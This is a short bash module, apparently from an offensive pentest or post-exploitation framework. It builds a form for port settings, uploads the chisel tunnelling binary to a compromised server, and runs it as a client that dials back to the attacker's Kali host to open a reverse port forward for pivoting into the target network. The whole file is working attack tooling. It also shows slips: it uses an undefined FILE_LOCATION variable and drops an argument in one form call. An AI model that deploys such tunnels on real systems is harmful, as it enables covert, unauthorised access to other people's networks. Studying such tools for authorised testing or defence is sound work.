#!/bin/bash

: '
download chisel agent to server and connect to proxy
'

LOCATION="${SCRIPTS_DIR}/portListening/chisel/.files"
FILE="chisel"

# Generate GUI form items (label, type (optional: default text), name, default (optional))
PROXY_PORT_FIELD=$(form_item  "proxy port" "number" "proxy_port" "9999")
LOCAL_PORT_FIELD=$(form_item  "local port" "number" "local_port" "")
LOCAL_IP_FIELD=$(form_item  "local ip" "local_ip" "127.0.0.1")
REMOTE_PORT_FIELD=$(form_item  "remote port" "number" "remote_port" "")

# Generate GUI form
generate_form "${PROXY_PORT_FIELD}" "${LOCAL_PORT_FIELD}" "${LOCAL_IP_FIELD}" "${REMOTE_PORT_FIELD}"

PROXY_PORT=${form_data["proxy_port"]}
LOCAL_PORT=${form_data["local_port"]}
LOCAL_IP=${form_data["local_ip"]}
REMOTE_PORT=${form_data["remote_port"]}

curl_upload_file "${LOCATION}" "${FILE}"
sleep 3

execute_command "${FILE_LOCATION} client ${KALI_IP}:${PROXY_PORT} R:${LOCAL_PORT}:${LOCAL_IP}:${REMOTE_PORT}"
create_new_line
